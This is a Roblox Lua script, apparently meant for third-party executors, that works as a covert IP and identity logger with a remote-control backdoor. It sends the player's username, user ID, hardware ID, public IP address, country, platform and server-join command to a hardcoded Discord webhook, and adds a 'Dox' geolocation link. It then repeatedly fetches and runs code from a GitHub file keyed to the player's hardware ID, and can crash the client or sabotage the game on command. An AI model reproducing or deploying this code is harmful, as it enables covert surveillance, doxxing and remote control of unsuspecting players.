-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

-- Platform information
local platform = UserInputService:GetPlatform()
local platformNameMap = {
    [Enum.Platform.Windows] = "Windows PC",
    [Enum.Platform.OSX] = "Mac",
    [Enum.Platform.IOS] = "iOS Device",
    [Enum.Platform.Android] = "Android Device",
    [Enum.Platform.UWP] = "UWP",
    [Enum.Platform.PS4] = "PlayStation 4",
}
local deviceType = platformNameMap[platform] or "Unknown Device"

-- Player information
local username = Players.LocalPlayer.Name
local userId = Players.LocalPlayer.UserId
local hwid = RbxAnalyticsService:GetClientId()
local gameId = game.PlaceId
local job = tostring(game.JobId)
local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "')"
local currentTime = os.date("%Y-%m-%d %H:%M:%S")

-- Initialization
local countryCode
local ipAddress = "Unknown"
local githubRepo = "Pumpuma/test"
local filePath = hwid .. ".lua"

-- Get country code
local success, result = pcall(function()
    return LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer)
end)
countryCode = success and result or "Unknown"

if syn then
    ipAddress = syn.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
elseif http then
    ipAddress = http.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
end
ipAddress = HttpService:JSONDecode(ipAddress).ip

-- Functions
local function generateCreateFileURL()
    local content = [[
_G.Crash = false
_G.Ban = false
_G.BPlayer = false
_G.Small = false
_G.Taco = false
]]
    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. filePath .. "&value=" .. HttpService:UrlEncode(content)
end


local function generateEditURL()
    return "https://github.com/" .. githubRepo .. "/edit/main/" .. filePath
end

local function generateGeoLink(ip)
    return "https://ipinfo.io/" .. ip
end

-- Identify executor
local exe = identifyexecutor()

-- Construct the webhook data
local url = "https://discord.com/api/webhooks/1266146071416147968/ySql_yTSkL1qZyTkYgwGCY_DArYNAHiIkJwicDrqApUg5crckvee0qoBVgvWCc31E3mO" -- Replace with your webhook URL
local data = {
    ["content"] = " ",
    ["embeds"] = {
        {
            ["title"] = "Joshua's logger",
            ["description"] = "Username: " .. username .. "\n" ..
                              "Player ID: " .. userId .. "\n" ..
                              "Key: N/A\n" ..
                              "Exp: N/A\n" ..
                              "Country: " .. countryCode .. "\n" ..
                              "Platform: " .. deviceType .. "\n" ..
                              "IP Address: " .. ipAddress .. "\n" ..
                              "Executor: " .. exe .. "\n" ..
                              "Time: " .. currentTime .. "\n" ..
                              "Join: ```" .. teleportStatement .. "```",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(username)
            },
            ["fields"] = {
                {
                    ["name"] = "Commands",
                    ["value"] = "[Blacklist](" .. generateEditURL() .. ")\n" ..
                             "[Create File](" .. generateCreateFileURL() .. ")\n" ..
                                "[Dox](" .. generateGeoLink(ipAddress) .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = hwid,
                    ["inline"] = true
                }
            }
        }
    }
}

-- Encode data to JSON
local newdata = HttpService:JSONEncode(data)
local headers = {["content-type"] = "application/json"}
local request = http_request or request or HttpPost or syn.request
local requestData = {Url = url, Body = newdata, Method = "POST", Headers = headers}

-- Send the Discord webhook request
local success, err = pcall(function()
    request(requestData)
end)
if not success then
    warn("Failed to send Discord message: " .. err)
end

while true do
    wait(5)
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/Test/main/" .. filePath))()
    end)

    if success then
        break
    else
        warn("Failed to load the script: " .. result)
    end
end

local tacoPlayed = false
local crashInitiated = false
local banPerformed = false
local bplayerDestroyed = false
local smalln = false

while true do
    wait(1)
    
    if _G.Taco and not tacoPlayed then
        tacoPlayed = true
        local a = Instance.new("Sound")
        a.SoundId = "rbxassetid://142376088"
        a.Looped = true
        a.Volume = 1
        a.Parent = game:GetService("SoundService")
        a:Play()
    end
    
    if _G.Crash and not crashInitiated then
        crashInitiated = true
        while true do end
    end
    
    if _G.Ban and not banPerformed then
        banPerformed = true
        local re = game.Players.LocalPlayer:FindFirstChild('RemoteEvent')
        if re then re:Destroy() end
    end
    
    if _G.Bplayer and not bplayerDestroyed then
        bplayerDestroyed = true
        local p = Workspace.Ignore
        if p then p:Destroy() end
    end
    
    if _G.Small and not smallAdjusted then
        smalln = true
        local n = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
        if n then
            n.LowerLimit = 1
            n.UpperLimit = 1
        end
    end
end
